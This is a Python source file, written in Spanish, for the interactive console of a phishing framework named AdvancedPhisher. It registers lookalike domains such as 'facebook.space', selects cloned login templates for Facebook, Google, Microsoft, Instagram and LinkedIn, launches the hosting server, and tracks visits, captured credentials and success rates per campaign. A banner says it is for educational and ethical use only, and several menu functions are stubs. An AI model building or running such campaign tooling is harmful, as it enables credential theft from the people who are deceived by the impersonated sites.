#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Console Interface - Interfaz de consola interactiva avanzada
Parte del framework AdvancedPhisher
"""

import os
import sys
import time
import threading
from pathlib import Path
from colorama import Fore, Style, init
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn
from tabulate import tabulate

# Inicializar colorama
init(autoreset=True)

class ConsoleInterface:
    def __init__(self, domain_manager, web_server, logger, config):
        self.domain_manager = domain_manager
        self.web_server = web_server
        self.logger = logger
        self.config = config
        self.console = Console()
        self.running = True
        
        # Estado actual
        self.current_domain = None
        self.current_template = None
        self.server_running = False
        
    def clear_screen(self):
        """Limpiar pantalla"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def show_banner(self):
        """Mostrar banner principal"""
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗     ║
║    ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝     ║
║    ███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║          ║
║    ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║          ║
║    ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗     ║
║    ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝     ║
║                                                              ║
║              ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗            ║
║              ██╔══██╗██║  ██║██║██╔════╝██║  ██║            ║
║              ██████╔╝███████║██║███████╗███████║            ║
║              ██╔═══╝ ██╔══██║██║╚════██║██╔══██║            ║
║              ██║     ██║  ██║██║███████║██║  ██║            ║
║              ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}    Framework Avanzado de Phishing para Educación en Ciberseguridad{Style.RESET_ALL}
{Fore.YELLOW}                    Versión 1.0 - Uso Ético Únicamente{Style.RESET_ALL}
{Fore.RED}              ⚠️  SOLO PARA FINES EDUCATIVOS Y DE INVESTIGACIÓN  ⚠️{Style.RESET_ALL}

{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}
"""
        print(banner)
        
    def show_status(self):
        """Mostrar estado actual del sistema"""
        status_table = Table(title="Estado del Sistema", show_header=True, header_style="bold magenta")
        status_table.add_column("Componente", style="cyan")
        status_table.add_column("Estado", style="green")
        status_table.add_column("Información", style="yellow")
        
        # Estado del servidor
        server_status = "🟢 Activo" if self.web_server.is_running() else "🔴 Inactivo"
        server_info = f"Puerto: {self.config.get('default_port', 8080)}" if self.web_server.is_running() else "N/A"
        status_table.add_row("Servidor Web", server_status, server_info)
        
        # Dominio actual
        domain_status = f"🌐 {self.current_domain}" if self.current_domain else "❌ Ninguno"
        domain_info = f"Template: {self.current_template}" if self.current_template else "N/A"
        status_table.add_row("Dominio Activo", domain_status, domain_info)
        
        # Estadísticas
        stats = self.web_server.get_server_stats()
        stats_status = f"📊 {stats.get('visits', 0)} visitas"
        stats_info = f"Capturas: {stats.get('captures', 0)} | Tasa: {stats.get('success_rate', 0):.1f}%"
        status_table.add_row("Estadísticas", stats_status, stats_info)
        
        # Dominios disponibles
        active_domains = len(self.domain_manager.get_active_domains())
        total_domains = len(self.domain_manager.domains)
        domains_status = f"🏠 {active_domains}/{total_domains}"
        domains_info = "Dominios activos/total"
        status_table.add_row("Dominios", domains_status, domains_info)
        
        self.console.print(status_table)
        print()
        
    def show_main_menu(self):
        """Mostrar menú principal"""
        menu_options = [
            "[1] 🌐 Gestión de Dominios",
            "[2] 📋 Seleccionar Template",
            "[3] ⚙️  Configurar Campaña",
            "[4] 🚀 Iniciar/Detener Servidor",
            "[5] 📊 Ver Estadísticas y Logs",
            "[6] 🛠️  Herramientas Auxiliares",
            "[7] ⚡ Modo Rápido",
            "[8] 📖 Ayuda y Documentación",
            "[0] 🚪 Salir"
        ]
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║                        MENÚ PRINCIPAL                       ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print()
        
        for option in menu_options:
            print(f"  {option}")
        print()
        
    def show_domains_menu(self):
        """Mostrar menú de gestión de dominios"""
        while True:
            self.clear_screen()
            self.show_banner()
            
            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║                    GESTIÓN DE DOMINIOS                      ║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            print()
            
            # Mostrar dominios existentes
            self.list_domains()
            
            print(f"{Fore.YELLOW}Opciones:{Style.RESET_ALL}")
            print("  [1] ➕ Agregar Dominio")
            print("  [2] ❌ Eliminar Dominio")
            print("  [3] ✅ Activar/Desactivar Dominio")
            print("  [4] ℹ️  Ver Información Detallada")
            print("  [5] 🔧 Configurar Dominio")
            print("  [6] 📤 Exportar Configuración")
            print("  [7] 📥 Importar Configuración")
            print("  [0] ⬅️  Volver al Menú Principal")
            print()
            
            choice = input(f"{Fore.GREEN}Seleccione una opción: {Style.RESET_ALL}")
            
            if choice == '1':
                self.add_domain_interactive()
            elif choice == '2':
                self.remove_domain_interactive()
            elif choice == '3':
                self.toggle_domain_interactive()
            elif choice == '4':
                self.show_domain_info_interactive()
            elif choice == '5':
                self.configure_domain_interactive()
            elif choice == '6':
                self.export_domains_interactive()
            elif choice == '7':
                self.import_domains_interactive()
            elif choice == '0':
                break
            else:
                print(f"{Fore.RED}Opción inválida. Presione Enter para continuar...{Style.RESET_ALL}")
                input()
                
    def list_domains(self):
        """Listar dominios en formato tabla"""
        domains = self.domain_manager.list_domains()
        
        if not domains:
            print(f"{Fore.YELLOW}No hay dominios configurados.{Style.RESET_ALL}")
            print()
            return
            
        # Crear tabla
        headers = ["#", "Nombre", "Dominio", "Estado", "SSL", "Template", "Visitas", "Capturas", "Éxito %"]
        rows = []
        
        for i, domain in enumerate(domains, 1):
            status = "🟢 Activo" if domain['active'] else "🔴 Inactivo"
            ssl_status = "🔒 Sí" if domain['ssl'] else "❌ No"
            
            rows.append([
                i,
                domain['name'],
                domain['domain'],
                status,
                ssl_status,
                domain['template'],
                domain['visits'],
                domain['captures'],
                f"{domain['success_rate']:.1f}%"
            ])
            
        print(tabulate(rows, headers=headers, tablefmt="grid"))
        print()
        
    def add_domain_interactive(self):
        """Agregar dominio de forma interactiva"""
        print(f"{Fore.CYAN}➕ Agregar Nuevo Dominio{Style.RESET_ALL}")
        print()
        
        try:
            name = input(f"{Fore.GREEN}Nombre del dominio (ej: facebook): {Style.RESET_ALL}")
            if not name:
                print(f"{Fore.RED}El nombre es requerido.{Style.RESET_ALL}")
                input("Presione Enter para continuar...")
                return
                
            domain = input(f"{Fore.GREEN}URL del dominio (ej: facebook.space): {Style.RESET_ALL}")
            if not domain:
                print(f"{Fore.RED}El dominio es requerido.{Style.RESET_ALL}")
                input("Presione Enter para continuar...")
                return
                
            # Listar templates disponibles
            templates = self.get_available_templates()
            if templates:
                print(f"{Fore.YELLOW}Templates disponibles:{Style.RESET_ALL}")
                for i, template in enumerate(templates, 1):
                    print(f"  [{i}] {template}")
                    
                template_choice = input(f"{Fore.GREEN}Seleccione template (número o nombre): {Style.RESET_ALL}")
                
                if template_choice.isdigit():
                    idx = int(template_choice) - 1
                    if 0 <= idx < len(templates):
                        template = templates[idx]
                    else:
                        template = 'facebook'  # Default
                else:
                    template = template_choice if template_choice in templates else 'facebook'
            else:
                template = input(f"{Fore.GREEN}Template (ej: facebook): {Style.RESET_ALL}") or 'facebook'
                
            ssl_enabled = input(f"{Fore.GREEN}Habilitar SSL? (s/N): {Style.RESET_ALL}").lower().startswith('s')
            
            port = input(f"{Fore.GREEN}Puerto (443 para SSL, 8080 para HTTP): {Style.RESET_ALL}")
            if port.isdigit():
                port = int(port)
            else:
                port = 443 if ssl_enabled else 8080
                
            # Agregar dominio
            if self.domain_manager.add_domain(name, domain, template, ssl_enabled, port):
                print(f"{Fore.GREEN}✅ Dominio '{name}' agregado exitosamente.{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ Error agregando dominio.{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Operación cancelada.{Style.RESET_ALL}")
            
        input("Presione Enter para continuar...")
        
    def remove_domain_interactive(self):
        """Eliminar dominio de forma interactiva"""
        domains = list(self.domain_manager.domains.keys())
        
        if not domains:
            print(f"{Fore.YELLOW}No hay dominios para eliminar.{Style.RESET_ALL}")
            input("Presione Enter para continuar...")
            return
            
        print(f"{Fore.RED}❌ Eliminar Dominio{Style.RESET_ALL}")
        print()
        
        for i, domain in enumerate(domains, 1):
            print(f"  [{i}] {domain}")
        print()
        
        choice = input(f"{Fore.GREEN}Seleccione dominio a eliminar (número o nombre): {Style.RESET_ALL}")
        
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(domains):
                domain_name = domains[idx]
            else:
                print(f"{Fore.RED}Selección inválida.{Style.RESET_ALL}")
                input("Presione Enter para continuar...")
                return
        else:
            domain_name = choice
            
        if domain_name not in self.domain_manager.domains:
            print(f"{Fore.RED}Dominio no encontrado.{Style.RESET_ALL}")
            input("Presione Enter para continuar...")
            return
            
        # Confirmar eliminación
        confirm = input(f"{Fore.YELLOW}¿Está seguro de eliminar '{domain_name}'? (s/N): {Style.RESET_ALL}")
        if confirm.lower().startswith('s'):
            if self.domain_manager.remove_domain(domain_name):
                print(f"{Fore.GREEN}✅ Dominio '{domain_name}' eliminado exitosamente.{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ Error eliminando dominio.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Operación cancelada.{Style.RESET_ALL}")
            
        input("Presione Enter para continuar...")
        
    def show_quick_mode(self):
        """Mostrar modo rápido"""
        self.clear_screen()
        self.show_banner()
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║                        MODO RÁPIDO                          ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print()
        
        # Mostrar dominios activos
        active_domains = self.domain_manager.get_active_domains()
        
        if not active_domains:
            print(f"{Fore.RED}❌ No hay dominios activos configurados.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Configure al menos un dominio en 'Gestión de Dominios' primero.{Style.RESET_ALL}")
            input("Presione Enter para continuar...")
            return
            
        print(f"{Fore.GREEN}Dominios disponibles:{Style.RESET_ALL}")
        domain_list = list(active_domains.keys())
        
        for i, domain_name in enumerate(domain_list, 1):
            domain_info = active_domains[domain_name]
            ssl_icon = "🔒" if domain_info.get('ssl') else "🔓"
            print(f"  [{i}] {ssl_icon} {domain_name} ({domain_info['domain']}) - {domain_info['template']}")
        print()
        
        choice = input(f"{Fore.GREEN}Seleccione dominio (número): {Style.RESET_ALL}")
        
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(domain_list):
                domain_name = domain_list[idx]
                domain_info = active_domains[domain_name]
                
                # Configurar y iniciar servidor
                self.current_domain = domain_info
                self.current_template = domain_info['template']
                
                print(f"{Fore.YELLOW}🚀 Iniciando servidor para {domain_name}...{Style.RESET_ALL}")
                
                ssl_enabled = domain_info.get('ssl', False)
                port = domain_info.get('port', 443 if ssl_enabled else 8080)
                
                if self.web_server.start_server(domain_name, port=port, ssl_enabled=ssl_enabled):
                    print(f"{Fore.GREEN}✅ Servidor iniciado exitosamente!{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}🌐 URL: {'https' if ssl_enabled else 'http'}://localhost:{port}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}🎯 Dominio objetivo: {domain_info['domain']}{Style.RESET_ALL}")
                    print()
                    print(f"{Fore.YELLOW}Presione Ctrl+C para detener el servidor...{Style.RESET_ALL}")
                    
                    try:
                        # Mantener servidor activo
                        while self.web_server.is_running():
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print(f"\n{Fore.YELLOW}🛑 Deteniendo servidor...{Style.RESET_ALL}")
                        self.web_server.stop_server()
                        print(f"{Fore.GREEN}✅ Servidor detenido.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Error iniciando servidor.{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Selección inválida.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Selección inválida.{Style.RESET_ALL}")
            
        input("Presione Enter para continuar...")
        
    def show_statistics(self):
        """Mostrar estadísticas detalladas"""
        self.clear_screen()
        self.show_banner()
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║                     ESTADÍSTICAS Y LOGS                     ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print()
        
        # Generar y mostrar reporte
        report = self.logger.generate_report('console', 24)
        print(report)
        
        print(f"{Fore.YELLOW}Opciones:{Style.RESET_ALL}")
        print("  [1] 📊 Estadísticas de 1 hora")
        print("  [2] 📊 Estadísticas de 24 horas")
        print("  [3] 📊 Estadísticas de 7 días")
        print("  [4] 📤 Exportar reporte")
        print("  [5] 🧹 Limpiar logs antiguos")
        print("  [0] ⬅️  Volver")
        print()
        
        choice = input(f"{Fore.GREEN}Seleccione una opción: {Style.RESET_ALL}")
        
        if choice == '1':
            report = self.logger.generate_report('console', 1)
            print(report)
        elif choice == '2':
            report = self.logger.generate_report('console', 24)
            print(report)
        elif choice == '3':
            report = self.logger.generate_report('console', 168)  # 7 días
            print(report)
        elif choice == '4':
            self.export_report_interactive()
        elif choice == '5':
            self.clean_logs_interactive()
            
        if choice != '0':
            input("Presione Enter para continuar...")
            
    def get_available_templates(self):
        """Obtener lista de templates disponibles"""
        templates_dir = Path(__file__).parent.parent / 'templates'
        if templates_dir.exists():
            return [d.name for d in templates_dir.iterdir() if d.is_dir()]
        return ['facebook', 'google', 'microsoft', 'instagram', 'linkedin']
        
    def run(self):
        """Ejecutar interfaz de consola principal"""
        try:
            while self.running:
                self.clear_screen()
                self.show_banner()
                self.show_status()
                self.show_main_menu()
                
                choice = input(f"{Fore.GREEN}Seleccione una opción: {Style.RESET_ALL}")
                
                if choice == '1':
                    self.show_domains_menu()
                elif choice == '2':
                    self.select_template_interactive()
                elif choice == '3':
                    self.configure_campaign_interactive()
                elif choice == '4':
                    self.toggle_server_interactive()
                elif choice == '5':
                    self.show_statistics()
                elif choice == '6':
                    self.show_tools_menu()
                elif choice == '7':
                    self.show_quick_mode()
                elif choice == '8':
                    self.show_help()
                elif choice == '0':
                    self.exit_application()
                else:
                    print(f"{Fore.RED}Opción inválida. Presione Enter para continuar...{Style.RESET_ALL}")
                    input()
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Saliendo...{Style.RESET_ALL}")
            self.exit_application()
        except Exception as e:
            self.logger.error(f"Error en interfaz de consola: {str(e)}")
            print(f"{Fore.RED}Error crítico: {str(e)}{Style.RESET_ALL}")
            
    def exit_application(self):
        """Salir de la aplicación"""
        print(f"{Fore.YELLOW}Cerrando AdvancedPhisher...{Style.RESET_ALL}")
        
        # Detener servidor si está activo
        if self.web_server.is_running():
            print(f"{Fore.YELLOW}Deteniendo servidor web...{Style.RESET_ALL}")
            self.web_server.stop_server()
            
        # Log evento de cierre
        self.logger.system_event('APPLICATION_STOP', 'AdvancedPhisher cerrado por el usuario')
        
        print(f"{Fore.GREEN}¡Gracias por usar AdvancedPhisher!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Recuerde usar esta herramienta de forma ética y responsable.{Style.RESET_ALL}")
        
        self.running = False
        sys.exit(0)
        
    # Métodos auxiliares (implementación básica)
    def select_template_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def configure_campaign_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def toggle_server_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def show_tools_menu(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def show_help(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def toggle_domain_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def show_domain_info_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def configure_domain_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def export_domains_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def import_domains_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def export_report_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")
        
    def clean_logs_interactive(self):
        input("Función en desarrollo. Presione Enter para continuar...")